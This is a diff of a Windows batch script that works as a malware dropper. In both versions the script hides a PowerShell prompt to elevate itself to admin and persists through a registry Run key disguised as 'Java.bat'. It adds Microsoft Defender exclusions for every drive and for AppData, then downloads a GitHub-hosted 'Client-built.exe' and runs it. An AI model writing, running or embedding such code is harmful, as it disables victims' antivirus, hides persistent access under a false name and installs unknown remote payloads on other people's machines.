@@ -1,29 +1,26 @@
 @echo off
-:: Auto-elevate to admin
+:: Auto-run as Admin
 net session >nul 2>&1
 if %errorlevel% NEQ 0 (
     powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb runAs"
     exit /b
 )
 
-:: Variables
+:: Vars
 set "APPDATA_PATH=%USERPROFILE%\AppData"
-set "STARTUP_FOLDER=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
-set "STARTUP_BAT=%STARTUP_FOLDER%\Java.bat"
-set "SELF_PATH=%~f0"
 set "TARGET_FILE=%APPDATA_PATH%\Client-built.exe"
 set "DOWNLOAD_URL=https://github.com/Abdullah67289/Ghoste-Trace/raw/refs/heads/main/Client-built.exe"
+set "REG_PATH=HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
+set "REG_NAME=Java.bat"
+set "SELF_PATH=%~f0"
 
-:: Optional: Copy to Startup folder
-if not exist "%STARTUP_BAT%" (
-    copy "%SELF_PATH%" "%STARTUP_BAT%" >nul
-    powershell -WindowStyle Hidden -Command "Unblock-File -Path '%STARTUP_BAT%'"
-)
+:: Delete old startup file (if any)
+del "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Java.bat" >nul 2>&1
 
-:: ✅ Force auto-start by adding to registry
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "JavaStartup" /d "\"%SELF_PATH%\"" /f
+:: ✅ Register THIS script as Java.bat in registry (will show in Task Manager)
+reg add "%REG_PATH%" /v "%REG_NAME%" /d "\"%SELF_PATH%\"" /f
 
-:: Add Defender exclusions (all real drives)
+:: Defender Exclusions (all drives)
 for %%L in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
     if exist %%L:\ (
         powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%%L:\'"
@@ -33,12 +30,8 @@ for %%L in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
 :: Exclude AppData
 powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%APPDATA_PATH%'"
 
-:: Download and run payload
+:: Download and run EXE
 powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%DOWNLOAD_URL%', '%TARGET_FILE%')"
 start "" "%TARGET_FILE%"
 
 exit
-
-
-:: By MrAboudi
-:: v2
